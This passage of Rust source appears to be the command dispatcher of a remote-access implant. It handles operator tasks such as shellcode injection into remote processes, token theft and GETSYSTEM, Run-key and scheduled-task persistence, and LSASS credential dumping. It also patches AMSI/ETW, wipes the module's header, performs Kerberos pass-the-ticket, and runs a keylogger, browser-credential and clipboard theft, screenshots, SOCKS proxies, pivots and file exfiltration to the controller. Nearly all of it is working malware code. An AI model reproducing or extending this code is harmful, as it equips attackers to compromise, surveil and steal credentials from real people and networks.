                if let Some(jitter) = parts.get(1).and_then(|v| v.parse::<u64>().ok()) {
                    DYN_JITTER_PCT.store(jitter, Ordering::Relaxed);
                }
            }
            t.send_result(task.id, "[+] sleep updated", "");
        }
        "SYSINFO" => {
            t.send_result(task.id, &sysinfo(), "");
        }
        "PS" => {
            #[cfg(target_os = "windows")]
            t.send_result(task.id, &shell("tasklist /FO CSV /NH 2>&1"), "");
            #[cfg(not(target_os = "windows"))]
            t.send_result(task.id, &shell("ps aux"), "");
        }
        "PWD" => {
            let cwd = std::env::current_dir()
                .map(|p| p.to_string_lossy().into_owned())
                .unwrap_or_else(|e| format!("[error: {}]", e));
            t.send_result(task.id, &cwd, "");
        }
        "CD" => match std::env::set_current_dir(&task.args) {
            Ok(_) => {
                let cwd = std::env::current_dir()
                    .map(|p| p.to_string_lossy().into_owned())
                    .unwrap_or_default();
                t.send_result(task.id, &cwd, "");
            }
            Err(e) => t.send_result(task.id, "", &format!("cd: {}", e)),
        },
        "LS" => {
            t.send_result(task.id, &ls(&task.args), "");
        }
        "LS_JSON" => {
            let dir = if task.args.trim().is_empty() { ".".to_string() } else { task.args.trim().to_string() };
            match std::fs::canonicalize(&dir) {
                Err(e) => {
                    let j = serde_json::json!({"error": e.to_string()});
                    t.send_result(task.id, &j.to_string(), "");
                }
                Ok(abs) => {
                    let abs_str = abs.to_string_lossy().into_owned();
                    let cwd = std::env::current_dir().map(|p| p.to_string_lossy().into_owned()).unwrap_or_default();
                    let mut entries = Vec::new();
                    if let Ok(rd) = std::fs::read_dir(&abs) {
                        for e in rd.flatten() {
                            let name = e.file_name().to_string_lossy().into_owned();
                            let is_dir = e.file_type().map(|t| t.is_dir()).unwrap_or(false);
                            let (sz, modtime) = e.metadata().map(|m| {
                                let sz = if is_dir { 0 } else { m.len() as i64 };
                                let mod_str = m.modified().ok()
                                    .and_then(|t| {
                                        let secs = t.duration_since(std::time::UNIX_EPOCH).ok()?.as_secs();
                                        let dt_secs = secs as i64;
                                        let days = dt_secs / 86400;
                                        let rem  = dt_secs % 86400;
                                        let hh   = rem / 3600;
                                        let mm   = (rem % 3600) / 60;
                                        let mut y = 1970i32; let mut d = days as i32;
                                        loop {
                                            let yd = if (y%4==0&&y%100!=0)||(y%400==0) {366} else {365};
                                            if d < yd { break; } d -= yd; y += 1;
                                        }
                                        let mdays = [31i32,if(y%4==0&&y%100!=0)||(y%400==0){29}else{28},31,30,31,30,31,31,30,31,30,31];
                                        let mut mo = 0usize;
                                        while mo < 12 && d >= mdays[mo] { d -= mdays[mo]; mo += 1; }
                                        Some(format!("{:04}-{:02}-{:02} {:02}:{:02}", y, mo+1, d+1, hh, mm))
                                    }).unwrap_or_default();
                                (sz, mod_str)
                            }).unwrap_or((0, String::new()));
                            entries.push(serde_json::json!({"name":name,"is_dir":is_dir,"size":sz,"mod":modtime}));
                        }
                    }
                    let resp = serde_json::json!({"cwd": cwd, "path": abs_str, "entries": entries});
                    t.send_result(task.id, &resp.to_string(), "");
                }
            }
        }
        "PS_JSON" => {
            #[cfg(target_os = "windows")]
            {
                let raw = shell("tasklist /FO CSV /NH 2>&1");
                let mut procs = Vec::new();
                for line in raw.lines() {
                    let line = line.trim().trim_matches('"');
                    let parts: Vec<&str> = line.splitn(6, "\",\"").collect();
                    if parts.len() >= 2 {
                        let name = parts[0].trim_matches('"');
                        let pid_str = parts[1].trim_matches('"');
                        if let Ok(pid) = pid_str.parse::<u32>() {
                            procs.push(serde_json::json!({"pid": pid, "name": name, "security": ""}));
                        }
                    }
                }
                t.send_result(task.id, &serde_json::to_string(&procs).unwrap_or_default(), "");
            }
            #[cfg(not(target_os = "windows"))]
            {
                let raw = shell("ps -eo pid,comm --no-headers 2>/dev/null");
                let mut procs = Vec::new();
                for line in raw.lines() {
                    let parts: Vec<&str> = line.trim().splitn(2, ' ').collect();
                    if parts.len() == 2 {
                        if let Ok(pid) = parts[0].trim().parse::<u32>() {
                            procs.push(serde_json::json!({"pid": pid, "name": parts[1].trim(), "security": ""}));
                        }
                    }
                }
                t.send_result(task.id, &serde_json::to_string(&procs).unwrap_or_default(), "");
            }
        }
        #[cfg(target_os = "windows")]
        "DRIVES" => {
            let raw = shell("wmic logicaldisk get name /format:list 2>&1");
            let mut entries = Vec::new();
            for line in raw.lines() {
                let l = line.trim();
                if let Some(rest) = l.strip_prefix("Name=") {
                    let drive = rest.trim();
                    if !drive.is_empty() {
                        entries.push(serde_json::json!({"name": format!("{}\\", drive), "is_dir": true, "size": 0, "mod": ""}));
                    }
                }
            }
            let resp = serde_json::json!({"cwd": "", "path": "", "drives": true, "entries": entries});
            t.send_result(task.id, &resp.to_string(), "");
        }
        #[cfg(target_os = "windows")]
        "NET_SHARES" => {
            let host = task.args.trim().trim_start_matches('\\').trim_start_matches('/');
            let raw = shell(&format!("net view \\\\{} /all 2>&1", host));
            let mut entries = Vec::new();
            let mut parsing = false;
            for line in raw.lines() {
                let l = line.trim();
                if l.contains("---") { parsing = true; continue; }
                if !parsing || l.is_empty() { continue; }
                let lower = l.to_lowercase();
                if lower.contains("completed") || lower.contains("completado") { break; }
                let parts: Vec<&str> = l.split_whitespace().collect();
                if parts.len() >= 2 && matches!(parts[1].to_lowercase().as_str(), "disk" | "disco") {
                    entries.push(serde_json::json!({"name": parts[0], "is_dir": true, "size": 0, "mod": ""}));
                }
            }
            let resp = serde_json::json!({"cwd": "", "path": format!("\\\\{}", host), "shares": true, "entries": entries});
            t.send_result(task.id, &resp.to_string(), "");
        }
        "KILL" => {
            t.send_result(task.id, "bye", "");
            std::process::exit(0);
        }
        "UPLOAD" => {
            // Server pushes file to agent: args = JSON {"filename":"...","remote_path":"..."}
            let j: serde_json::Value = match serde_json::from_str(&task.args) {
                Ok(v) => v,
                Err(e) => {
                    t.send_result(task.id, "", &format!("json parse: {}", e));
                    return;
                }
            };
            let filename    = j["filename"].as_str().unwrap_or("");
            let remote_path = j["remote_path"].as_str().unwrap_or("");
            let data = t.download_file(filename);
            if data.is_empty() {
                t.send_result(task.id, "", "download from server failed");
                return;
            }
            let base = std::path::Path::new(filename)
                .file_name().and_then(|n| n.to_str()).unwrap_or(filename);
            let dest = if remote_path == "." || remote_path.ends_with('\\') || remote_path.ends_with('/') {
                let sep = if remote_path.contains('\\') { "\\" } else { "/" };
                let dir = remote_path.trim_end_matches(['\\', '/']);
                if dir.is_empty() { base.to_string() } else { format!("{}{}{}", dir, sep, base) }
            } else {
                remote_path.to_string()
            };
            match std::fs::write(&dest, &data) {
                Ok(_) => t.send_result(
                    task.id,
                    &format!("written {} bytes to {}", data.len(), dest),
                    "",
                ),
                Err(e) => t.send_result(task.id, "", &format!("write: {}", e)),
            }
        }
        "DOWNLOAD" => {
            // Agent reads local file and uploads to server
            let path = &task.args;
            let name = std::path::Path::new(path)
                .file_name()
                .map(|n| n.to_string_lossy().into_owned())
                .unwrap_or_else(|| path.clone());
            match std::fs::read(path) {
                Ok(data) => {
                    let n = data.len();
                    t.upload_file(task.id, &name, &data);
                    t.send_result(task.id, &format!("uploaded {} bytes", n), "");
                }
                Err(e) => t.send_result(task.id, "", &format!("read: {}", e)),
            }
        }
        "CAT" => {
            match std::fs::read_to_string(&task.args) {
                Ok(s) => t.send_result(task.id, &s, ""),
                Err(e) => t.send_result(task.id, "", &format!("cat: {}", e)),
            }
        }
        "MKDIR" => {
            match std::fs::create_dir_all(&task.args) {
                Ok(_) => t.send_result(task.id, "[+] created", ""),
                Err(e) => t.send_result(task.id, "", &format!("mkdir: {}", e)),
            }
        }
        "RM" => {
            let r = if std::path::Path::new(&task.args).is_dir() {
                std::fs::remove_dir_all(&task.args)
            } else {
                std::fs::remove_file(&task.args)
            };
            match r {
                Ok(_) => t.send_result(task.id, "[+] removed", ""),
                Err(e) => t.send_result(task.id, "", &format!("rm: {}", e)),
            }
        }
        "CP" | "MV" => {
            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
            let src = j.get("src").and_then(|v| v.as_str()).unwrap_or("");
            let dst = j.get("dst").and_then(|v| v.as_str()).unwrap_or("");
            if src.is_empty() || dst.is_empty() {
                t.send_result(task.id, "", "usage: {src,dst}");
            } else {
                let result = if typ == "CP" {
                    std::fs::copy(src, dst).map(|_| ())
                } else {
                    std::fs::rename(src, dst)
                };
                match result {
                    Ok(_) => t.send_result(task.id, &format!("[+] {} {} → {}", typ.to_lowercase(), src, dst), ""),
                    Err(e) => t.send_result(task.id, "", &format!("{}: {}", typ.to_lowercase(), e)),
                }
            }
        }
        "GREP" => {
            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
            let pattern = j.get("pattern").and_then(|v| v.as_str()).unwrap_or("");
            let path = j.get("path").and_then(|v| v.as_str()).unwrap_or(".");
            if pattern.is_empty() {
                t.send_result(task.id, "", "usage: {pattern,path}");
            } else {
                #[cfg(target_os = "windows")]
                let cmd = format!(r#"findstr /spin /c:"{}" "{}" 2>&1"#, pattern.replace('"', ""), path.replace('"', ""));
                #[cfg(not(target_os = "windows"))]
                let cmd = format!("grep -R -n -- {} {} 2>&1", shell_quote(pattern), shell_quote(path));
                t.send_result(task.id, &shell(&cmd), "");
            }
        }
        "MOUNT" => {
            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
            let path = j.get("path").and_then(|v| v.as_str()).unwrap_or("");
            let cmd = if path.is_empty() { "mount".to_string() } else { format!("mount {}", shell_quote(path)) };
            t.send_result(task.id, &shell(&cmd), "");
        }
        "CHMOD" | "CHOWN" | "CHTIMES" => {
            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
            let path = j.get("path").and_then(|v| v.as_str()).unwrap_or("");
            let cmd = match typ.as_str() {
                "CHMOD" => format!("chmod {} {} 2>&1", j.get("mode").and_then(|v| v.as_str()).unwrap_or(""), shell_quote(path)),
                "CHOWN" => format!("chown {}{} {} 2>&1", j.get("owner").and_then(|v| v.as_str()).unwrap_or(""),
                    j.get("group").and_then(|v| v.as_str()).map(|g| format!(":{}", g)).unwrap_or_default(), shell_quote(path)),
                _ => format!("touch -d {} {} 2>&1", shell_quote(j.get("mtime").and_then(|v| v.as_str()).unwrap_or("")), shell_quote(path)),
            };
            #[cfg(target_os = "windows")]
            t.send_result(task.id, "", &format!("{}: not supported on Windows", typ.to_lowercase()));
            #[cfg(not(target_os = "windows"))]
            t.send_result(task.id, &shell(&cmd), "");
        }
        "ENV" => {
            let out = std::env::vars()
                .map(|(k, v)| format!("{}={}", k, v))
                .collect::<Vec<_>>()
                .join("\n");
            t.send_result(task.id, &out, "");
        }
        #[cfg(target_os = "windows")]
        "SCREENSHOT" => {
            let sc_ps = concat!(
                "Add-Type -AssemblyName System.Windows.Forms,System.Drawing;",
                "$bmp=[System.Drawing.Bitmap]::new([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,",
                "[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height);",
                "$gfx=[System.Drawing.Graphics]::FromImage($bmp);",
                "$gfx.CopyFromScreen(0,0,0,0,$bmp.Size);",
                "$ms=[System.IO.MemoryStream]::new();$bmp.Save($ms,'Png');",
                "[Convert]::ToBase64String($ms.ToArray())"
            );
            match Command::new("powershell.exe").args(["-NoP","-NonI","-W","Hidden","-C",sc_ps]).output() {
                Ok(o) if o.status.success() => {
                    let b64 = String::from_utf8_lossy(&o.stdout).trim().to_string();
                    if let Ok(png) = STANDARD.decode(&b64) {
                        t.upload_file(task.id, "screenshot.png", &png);
                        t.send_result(task.id, "[+] screenshot uploaded", "");
                    } else { t.send_result(task.id, "", "base64 decode failed"); }
                }
                Ok(o) => t.send_result(task.id, "", &String::from_utf8_lossy(&o.stderr)),
                Err(e) => t.send_result(task.id, "", &format!("screenshot: {}", e)),
            }
        }
        "CONFIG" => {
            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
            if let Some(s) = j.get("sleep_sec").and_then(|v| v.as_u64()) {
                DYN_SLEEP_SEC.store(s, Ordering::Relaxed);
            }
            if let Some(j2) = j.get("jitter_pct").and_then(|v| v.as_u64()) {
                DYN_JITTER_PCT.store(j2, Ordering::Relaxed);
            }
            if let Some(wh) = j.get("working_hours").and_then(|v| v.as_str()) {
                *dyn_working_hours() = wh.to_string();
            }
            t.send_result(task.id, "[+] config updated", "");
        }
        #[cfg(target_os = "windows")]
        "STAGE2" => {
            if task.payload.is_empty() { t.send_result(task.id, "", "STAGE2: no shellcode payload"); return; }
            let r = unsafe { inject_self(&task.payload) };
            t.send_result(task.id, &r, "");
        }
        #[cfg(target_os = "windows")]
        "SHELLCODE_STOMP" => {
            if task.payload.is_empty() { t.send_result(task.id, "", "SHELLCODE_STOMP: no shellcode payload"); return; }
            let dll_hint = serde_json::from_str::<serde_json::Value>(&task.args)
                .ok().and_then(|v| v.get("dll").and_then(|d| d.as_str()).map(str::to_owned))
                .unwrap_or_default();
            let r = unsafe { shellcode_stomp(&task.payload, &dll_hint) };
            t.send_result(task.id, &r, "");
        }
        #[cfg(target_os = "windows")]
        "UDRL" => {
            if task.payload.is_empty() { t.send_result(task.id, "", "UDRL: no shellcode payload"); return; }
            let r = unsafe { phantom_load(&task.payload) };
            t.send_result(task.id, &r, "");
        }
        #[cfg(target_os = "windows")]
        "INJECT_REMOTE" => {
            if task.payload.is_empty() { t.send_result(task.id, "", "no shellcode payload"); return; }
            let pid = serde_json::from_str::<serde_json::Value>(&task.args)
                .ok().and_then(|v| v.get("pid").and_then(|p| p.as_u64())).unwrap_or(0) as u32;
            if pid == 0 { t.send_result(task.id, "", "INJECT_REMOTE requires {\"pid\":N}"); return; }
            let r = unsafe { inject_remote(pid, &task.payload) };
            t.send_result(task.id, &r, "");
        }
        #[cfg(target_os = "windows")]
        "INJECT_APC" => {
            if task.payload.is_empty() { t.send_result(task.id, "", "no shellcode payload"); return; }
            let pid = serde_json::from_str::<serde_json::Value>(&task.args)
                .ok().and_then(|v| v.get("pid").and_then(|p| p.as_u64())).unwrap_or(0) as u32;
            if pid == 0 { t.send_result(task.id, "", "INJECT_APC requires {\"pid\":N}"); return; }
            let r = unsafe { inject_apc(pid, &task.payload) };
            t.send_result(task.id, &r, "");
        }
        #[cfg(target_os = "windows")]
        "DOTNET_EXEC" => {
            let j = serde_json::from_str::<serde_json::Value>(&task.args).unwrap_or_default();
            let b64 = j.get("asm").and_then(|v| v.as_str()).unwrap_or("");
            if b64.is_empty() { t.send_result(task.id, "", "DOTNET_EXEC: missing asm field"); return; }
            let asm_bytes = match STANDARD.decode(b64) {
                Ok(v) => v,
                Err(e) => { t.send_result(task.id, "", &format!("b64 decode: {}", e)); return; }
            };
            let asm_args = j.get("args").and_then(|v| v.as_str()).unwrap_or("").to_string();
            let timeout_sec = j.get("timeout_sec").and_then(|v| v.as_u64()).unwrap_or(0);
            let r = crate::dotnet::fork_run_assembly(&asm_bytes, &asm_args, timeout_sec);
            t.send_result(task.id, &r, "");
        }
        #[cfg(target_os = "windows")]
        "TOKEN_STEAL" => {
            let pid = serde_json::from_str::<serde_json::Value>(&task.args)
                .ok().and_then(|v| v.get("pid").and_then(|p| p.as_u64())).unwrap_or(0) as u32;
            if pid == 0 { t.send_result(task.id, "", "TOKEN_STEAL requires {\"pid\":N}"); return; }
            let r = unsafe { token_steal(pid) };
            t.send_result(task.id, &r, "");
        }
        #[cfg(target_os = "windows")]
        "TOKEN_MAKE" => {
            let (user_s, domain_s, pass_s);
            if task.args.trim_start().starts_with('{') {
                let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
                user_s   = j.get("user").and_then(|v| v.as_str()).unwrap_or("").to_string();
                domain_s = j.get("domain").and_then(|v| v.as_str()).unwrap_or(".").to_string();
                pass_s   = j.get("pass").and_then(|v| v.as_str()).unwrap_or("").to_string();
            } else {
                // "domain\user pass" or "user pass"
                let sp = task.args.find(' ').unwrap_or(task.args.len());
                let domuser = &task.args[..sp];
                pass_s = if sp < task.args.len() { task.args[sp+1..].to_string() } else { String::new() };
                if let Some(bs) = domuser.find('\\') {
                    domain_s = domuser[..bs].to_string();
                    user_s   = domuser[bs+1..].to_string();
                } else {
                    domain_s = ".".to_string();
                    user_s   = domuser.to_string();
                }
            }
            if user_s.is_empty() || pass_s.is_empty() {
                t.send_result(task.id, "", "TOKEN_MAKE requires user+pass"); return;
            }
            let r = unsafe { token_make(&user_s, &domain_s, &pass_s) };
            t.send_result(task.id, &r, "");
        }
        #[cfg(target_os = "windows")]
        "TOKEN_DROP" | "REV2SELF" => {
            unsafe {
                RevertToSelf();
                let old = G_STOLEN_TOKEN.swap(0, Ordering::AcqRel);
                if old != 0 { CloseHandle(old); }
            }
            t.send_result(task.id, "[+] reverted to original token", "");
        }
        #[cfg(target_os = "windows")]
        "TOKEN_WHOAMI" => {
            t.send_result(task.id, &shell("whoami 2>&1"), "");
        }
        #[cfg(target_os = "windows")]
        "GETSYSTEM" => {
            let r = unsafe { get_system() };
            if r.starts_with("[+]") {
                t.send_result_admin(task.id, &r, "", true);
            } else {
                t.send_result(task.id, &r, "");
            }
        }
        #[cfg(target_os = "windows")]
        "PERSIST" => {
            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
            let name = j.get("name").and_then(|v| v.as_str()).unwrap_or("Updater");
            let cmd2 = j.get("cmd").and_then(|v| v.as_str()).unwrap_or("");
            let meth = j.get("method").and_then(|v| v.as_str()).unwrap_or("registry");
            if cmd2.is_empty() { t.send_result(task.id, "", "PERSIST requires cmd"); return; }
            let out = if meth == "schtask" {
                shell(&format!("schtasks /create /tn \"{}\" /tr \"{}\" /sc ONLOGON /ru SYSTEM /f 2>&1", name, cmd2))
            } else {
                shell(&format!("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"{}\" /t REG_SZ /d \"{}\" /f 2>&1", name, cmd2))
            };
            t.send_result(task.id, &out, "");
        }
        #[cfg(target_os = "windows")]
        "PERSIST_RM" => {
            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
            let name = j.get("name").and_then(|v| v.as_str()).unwrap_or("");
            let meth = j.get("method").and_then(|v| v.as_str()).unwrap_or("registry");
            if name.is_empty() { t.send_result(task.id, "", "PERSIST_RM requires name"); return; }
            let out = if meth == "schtask" {
                shell(&format!("schtasks /delete /tn \"{}\" /f 2>&1", name))
            } else {
                shell(&format!("reg delete \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"{}\" /f 2>&1", name))
            };
            t.send_result(task.id, &out, "");
        }
        #[cfg(target_os = "windows")]
        "REG_QUERY" => {
            let raw = task.args.trim();
            let j = serde_json::from_str::<serde_json::Value>(raw).ok();
            let path = j.as_ref()
                .and_then(|v| v.get("path")).and_then(|v| v.as_str())
                .unwrap_or(raw);
            let name = j.as_ref()
                .and_then(|v| v.get("name")).and_then(|v| v.as_str())
                .unwrap_or("");
            let cmd = if name.is_empty() {
                format!("reg query \"{}\" 2>&1", path)
            } else {
                format!("reg query \"{}\" /v \"{}\" 2>&1", path, name)
            };
            t.send_result(task.id, &shell(&cmd), "");
        }
        #[cfg(target_os = "windows")]
        "REG_LIST" => {
            let raw = task.args.trim();
            let j = serde_json::from_str::<serde_json::Value>(raw).ok();
            let path = j.as_ref()
                .and_then(|v| v.get("path")).and_then(|v| v.as_str())
                .unwrap_or(raw);
            t.send_result(task.id, &shell(&format!("reg query \"{}\" /s 2>&1", path)), "");
        }
        #[cfg(target_os = "windows")]
        "REG_SET" => {
            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
            let path = j.get("path").and_then(|v| v.as_str()).unwrap_or("");
            let name = j.get("name").and_then(|v| v.as_str()).unwrap_or("");
            let typ2 = j.get("type").and_then(|v| v.as_str()).unwrap_or("REG_SZ");
            let val  = j.get("value").and_then(|v| v.as_str()).unwrap_or("");
            let out  = shell(&format!("reg add \"{}\" /v \"{}\" /t {} /d \"{}\" /f 2>&1", path, name, typ2, val));
            t.send_result(task.id, &out, "");
        }
        #[cfg(target_os = "windows")]
        "REG_DELETE" => {
            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
            let path = j.get("path").and_then(|v| v.as_str()).unwrap_or("");
            let name = j.get("name").and_then(|v| v.as_str()).unwrap_or("");
            let cmd2 = if name.is_empty() {
                format!("reg delete \"{}\" /f 2>&1", path)
            } else {
                format!("reg delete \"{}\" /v \"{}\" /f 2>&1", path, name)
            };
            t.send_result(task.id, &shell(&cmd2), "");
        }
        #[cfg(target_os = "windows")]
        "PORT_SCAN" => {
            let (host, ports, timeout) = if task.args.trim_start().starts_with('{') {
                let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
                (
                    j.get("host").and_then(|v| v.as_str()).unwrap_or("127.0.0.1").to_string(),
                    j.get("ports").and_then(|v| v.as_str()).unwrap_or("80,443,445,3389").to_string(),
                    j.get("timeout").and_then(|v| v.as_u64()).unwrap_or(500),
                )
            } else {
                let parts: Vec<&str> = task.args.split_whitespace().collect();
                let h = parts.get(0).copied().unwrap_or("127.0.0.1").to_string();
                let p = parts.get(1).copied().unwrap_or("80,443,445,3389").to_string();
                let t_ms = parts.get(2).and_then(|s| s.parse::<u64>().ok()).unwrap_or(500);
                (h, p, t_ms)
            };
            let script = format!(
                "$h='{}';$t={};'{}'.Split(',') | ForEach-Object {{ $p=[int]$_;\
                $s=New-Object System.Net.Sockets.TcpClient;\
                $a=$s.BeginConnect($h,$p,$null,$null);\
                if($a.AsyncWaitHandle.WaitOne($t)){{if($s.Connected){{'OPEN '+$h+':'+$p}};$s.Close()}} }}",
                host, timeout, ports
            );
            let out = ps(&script);
            t.send_result(task.id, if out.trim().is_empty() { "no open ports" } else { &out }, "");
        }
        #[cfg(target_os = "windows")]
        "MINIDUMP" => {
            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
            let path = j.get("path").and_then(|v| v.as_str()).unwrap_or("C:\\Windows\\Temp\\1.dmp");
            let script = format!(
                "$p=(Get-Process lsass).Id; rundll32.exe C:\\Windows\\System32\\comsvcs.dll,MiniDump $p '{}' full",
                path
            );
            let out = ps(&script);
            if out.trim().is_empty() {
                t.send_result(task.id, &format!("[+] dump written to {}", path), "");
            } else {
                t.send_result(task.id, &out, "");
            }
        }
        #[cfg(target_os = "windows")]
        "LSASS_DUMP_NT" => {
            let lsas_pid: u32 = task.args.trim().parse().unwrap_or(0);
            let data = unsafe { lsass_dump_nt(lsas_pid) };
            if data.is_empty() {
                t.send_result(task.id, "", "lsass_dump_nt: dump failed (need admin?)");
            } else {
                let n = data.len();
                t.upload_file(task.id, "lsass_nt.dmp", &data);
                t.send_result(task.id, &format!("[+] lsass NT dump: {} bytes", n), "");
            }
        }

        #[cfg(target_os = "windows")]
        "PPID" => {
            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
            let cmd2   = j.get("cmd").and_then(|v| v.as_str()).unwrap_or("");
            let parent = j.get("parent").and_then(|v| v.as_str()).unwrap_or("explorer.exe");
            if cmd2.is_empty() { t.send_result(task.id, "", "PPID requires {\"cmd\":\"...\"}"); return; }
            let r = unsafe { spawn_with_ppid(cmd2, parent) };
            t.send_result(task.id, &r, "");
        }
        #[cfg(target_os = "windows")]
        "HWBP_CLEAR" => {
            use windows_sys::Win32::System::Threading::{GetCurrentThreadId, THREAD_GET_CONTEXT, THREAD_SET_CONTEXT};
            let r = unsafe {
                let tid = GetCurrentThreadId();
                let ht = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, 0, tid);
                if ht == 0 {
                    format!("OpenThread failed (err {})", GetLastError())
                } else {
                    let mut ctx: CONTEXT = std::mem::zeroed();
                    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS_AMD64;
                    if GetThreadContext(ht, &mut ctx) != 0 {
                        ctx.Dr0 = 0; ctx.Dr1 = 0; ctx.Dr2 = 0; ctx.Dr3 = 0;
                        ctx.Dr6 = 0; ctx.Dr7 = 0;
                        SetThreadContext(ht, &ctx);
                    }
                    CloseHandle(ht);
                    "[+] hardware breakpoints cleared".to_string()
                }
            };
            t.send_result(task.id, &r, "");
        }
        #[cfg(target_os = "windows")]
        "AMSI_BYPASS" => {
            crate::evasion::patch_amsi();
            t.send_result(task.id, "[+] AMSI/ETW re-patched", "");
        }
        #[cfg(target_os = "windows")]
        "WIPE_MZ" => {
            let r = unsafe {
                let base = GetModuleHandleW(std::ptr::null()) as *mut u8;
                if base.is_null() {
                    format!("GetModuleHandleW failed (err {})", GetLastError())
                } else {
                    let mut old = 0u32;
                    VirtualProtect(base as *const _, 2, PAGE_READWRITE, &mut old);
                    *base = 0;
                    *base.add(1) = 0;
                    VirtualProtect(base as *const _, 2, old, &mut old);
                    "[+] MZ header wiped".to_string()
                }
            };
            t.send_result(task.id, &r, "");
        }
        #[cfg(target_os = "windows")]
        "KERB_LIST" => {
            let r = kerberos::kerb_list_tickets();
            t.send_result(task.id, &r, "");
        }
        #[cfg(target_os = "windows")]
        "KERB_PTT" => {
            let b64 = serde_json::from_str::<serde_json::Value>(&task.args)
                .ok()
                .and_then(|v| v.get("ticket").and_then(|t| t.as_str()).map(String::from))
                .unwrap_or_default();
            if b64.is_empty() {
                t.send_result(task.id, "", "KERB_PTT requires {\"ticket\":\"<b64>\"}");
                return;
            }
            let r = kerberos::kerb_pass_ticket(&b64);
            t.send_result(task.id, &r, "");
        }
        #[cfg(target_os = "windows")]
        "KERB_PURGE" => {
            let r = kerberos::kerb_purge();
            t.send_result(task.id, &r, "");
        }
        #[cfg(target_os = "windows")]
        "EXEC_PE" => {
            if task.payload.is_empty() {
                t.send_result(task.id, "", "EXEC_PE requires a PE payload");
                return;
            }
            let r = pe_exec::exec_pe(&task.payload);
            t.send_result(task.id, &r, "");
        }
        #[cfg(target_os = "windows")]
        "SCREENWATCH_START" => {
            let interval = if task.args.trim().starts_with('{') {
                let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
                j.get("interval").and_then(|v| v.as_u64()).unwrap_or(5)
            } else {
                task.args.trim().parse::<u64>().unwrap_or(5)
            };
            spawn_screenwatch_thread(interval);
            t.send_result(task.id, "[+] screenwatch started", "");
        }
        #[cfg(target_os = "windows")]
        "SCREENWATCH_STOP" => {
            SCREENWATCH_STOP.store(true, Ordering::Relaxed);
            let handle = screenwatch_handle().take();
            if let Some(h) = handle { let _ = h.join(); }
            t.send_result(task.id, "[+] screenwatch stopped", "");
        }
        #[cfg(target_os = "windows")]
        "KEYLOG_START" => {
            keylog::keylog_start();
            t.send_result(task.id, "[+] keylogger started", "");
        }
        #[cfg(target_os = "windows")]
        "KEYLOG_STOP" => {
            keylog::keylog_stop();
            t.send_result(task.id, "[+] keylogger stopped", "");
        }
        #[cfg(target_os = "windows")]
        "KEYLOG_DUMP" => {
            let out = keylog::keylog_dump();
            t.send_result(task.id, if out.is_empty() { "[no keystrokes]" } else { &out }, "");
        }
        "SOCKS_START" => {
            let port = if task.args.trim().starts_with('{') {
                let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
                j.get("port").and_then(|v| v.as_u64()).unwrap_or(1080) as u16
            } else {
                task.args.trim().parse::<u16>().unwrap_or(1080)
            };
            match socks::socks_start(port) {
                Ok(_) => t.send_result(task.id, &format!("[+] SOCKS5 proxy started on port {}", port), ""),
                Err(e) => t.send_result(task.id, "", &e),
            }
        }
        "SOCKS_STOP" => {
            socks::socks_stop();
            t.send_result(task.id, "[+] SOCKS5 proxy stopped", "");
        }
        #[cfg(target_os = "windows")]
        "BROWSER_CREDS" => {
            let result = browser_creds::do_browser_creds();
            t.send_result(task.id, &result, "");
        }
        #[cfg(target_os = "windows")]
        "CLIP_GET" => {
            t.send_result(task.id, &clipboard::clip_get(), "");
        }
        #[cfg(target_os = "windows")]
        "CLIP_MONITOR_START" => {
            let secs: u64 = task.args.trim().parse().unwrap_or(5);
            t.send_result(task.id, clipboard::clip_monitor_start(secs), "");
        }
        #[cfg(target_os = "windows")]
        "CLIP_MONITOR_DUMP" => {
            t.send_result(task.id, &clipboard::clip_monitor_dump(), "");
        }
        #[cfg(target_os = "windows")]
        "CLIP_MONITOR_STOP" => {
            t.send_result(task.id, clipboard::clip_monitor_stop(), "");
        }
        "RSOCKS_START" => {
            let port: u16 = task.args.trim().parse().unwrap_or(0);
            if port == 0 {
                t.send_result(task.id, "", "RSOCKS_START requires a callback port number");
            } else {
                t.send_result(task.id, &rsocks::rsocks_start(port), "");
            }
        }
        "RSOCKS_STOP" => {
            t.send_result(task.id, rsocks::rsocks_stop(), "");
        }
        "HTTP_PIVOT_START" => {
            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
            let port = j.get("port").and_then(|v| v.as_u64()).unwrap_or(0) as u16;
            if port == 0 {
                t.send_result(task.id, "", "HTTP_PIVOT_START requires {port:N}");
            } else {
                http_pivot::set_http_pivot_agent_id(&t.agent_id);
                t.send_result(task.id, &http_pivot::start_http_pivot(port), "");
            }
        }
        "HTTP_PIVOT_STOP" => {
            t.send_result(task.id, http_pivot::stop_http_pivot(), "");
        }
        "TCP_PIVOT_START" => {
            let j: serde_json::Value = serde_json::from_str(&task.args).unwrap_or_default();
            let port = j.get("port").and_then(|v| v.as_u64()).unwrap_or(0) as u16;
            if port == 0 {
                t.send_result(task.id, "", "TCP_PIVOT_START requires {port:N}");
            } else {
                tcp_pivot::set_tcp_pivot_agent_id(&t.agent_id);
                t.send_result(task.id, &tcp_pivot::start_tcp_pivot(port), "");
            }
        }
        "TCP_PIVOT_STOP" => {
            t.send_result(task.id, tcp_pivot::stop_tcp_pivot(), "");
        }
        "PIPE_START" => {
            #[cfg(target_os = "windows")]
            {
                let result = pipe_server::pipe_server_start(&task.args, &t.agent_id);
